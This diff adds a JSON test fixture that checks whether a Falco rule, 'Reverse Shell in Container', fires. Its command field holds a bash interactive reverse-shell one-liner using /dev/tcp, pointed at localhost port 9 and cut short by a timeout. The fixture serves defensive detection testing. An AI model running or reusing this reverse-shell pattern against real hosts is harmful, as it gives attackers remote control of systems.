@@ -1,0 +1,6 @@
+{
+  "rule": "detections/falco/reverse-shell.yaml",
+  "expect_rule": "Reverse Shell in Container",
+  "image": "bash:5",
+  "cmd": "bash -c 'timeout 2 bash -i >& /dev/tcp/127.0.0.1/9 0>&1' || true"
+}
